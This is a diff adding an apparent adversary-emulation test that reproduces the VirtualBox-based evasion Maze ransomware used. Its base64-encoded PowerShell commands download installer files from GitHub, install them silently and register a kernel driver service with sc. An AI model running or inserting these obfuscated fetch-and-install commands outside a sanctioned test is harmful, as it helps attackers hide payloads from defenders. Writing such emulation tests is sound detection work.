@@ -1,0 +1,36 @@
+- id: d8704af7-bac9-59b1-9635-ab863cf18d6a
+  name: Soumaia ART Tests - Register Portable Virtualbox
+  description: "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)"
+  tactic: stealth
+  technique:
+    attack_id: T1564.006
+    name: Run Virtual Instance
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFYAaQByAHQAdQBhAGwAYgBvAHgAXwA1ADIALgBtAHMAaQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABWAGkAcgB0AHUAYQBsAGIAbwB4AF8ANQAyAC4AbQBzAGkAIgApACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADYANAAuADAAMAA2AC8AYgBpAG4ALwBWAGkAcgB0AHUAYQBsAGIAbwB4AF8ANQAyAC4AbQBzAGkAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAFYAaQByAHQAdQBhAGwAYgBvAHgAXwA1ADIALgBtAHMAaQAiAAoA
+          )
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAGMAbwBtAG0AbwBuAC4AYwBhAGIAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABjAG8AbQBtAG8AbgAuAGMAYQBiACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEANQA2ADQALgAwADAANgAvAGIAaQBuAC8AYwBvAG0AbQBvAG4ALgBjAGEAYgAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwAYwBvAG0AbQBvAG4ALgBjAGEAYgAiACAACgA=
+          )
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAQwA6AFwAUAByAG8AZwByAGEAbQAgAEYAaQBsAGUAcwBcAE8AcgBhAGMAbABlAFwAVgBpAHIAdAB1AGEAbABCAG8AeABcAFYAYgBvAHgAQwAuAGQAbABsACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand bQBzAGkAZQB4AGUAYwAgAC8AaQAgACIALgBcAFYAaQByAHQAdQBhAGwAYgBvAHgAXwA1ADIALgBtAHMAaQAiACAALwBxAG4ACgA=
+          )
+          "C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe" /reregserver
+          regsvr32 /S "C:\Program Files\Oracle\VirtualBox\VboxC.dll"
+          rundll32 "C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init"
+          sc create VBoxDRV binpath= "C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys" type= kernel start= auto error= normal displayname= PortableVBoxDRV
+          sc start VBoxDRV
+        cleanup: |-
+          sc stop VBoxDRV
+          sc delete VBoxDRV
+          regsvr32 /u /S "C:\Program Files\Oracle\VirtualBox\VboxC.dll"
+          msiexec /x ".\Virtualbox_52.msi" /qn
+        payloads:
+        - Virtualbox_52.msi
+        - common.cab
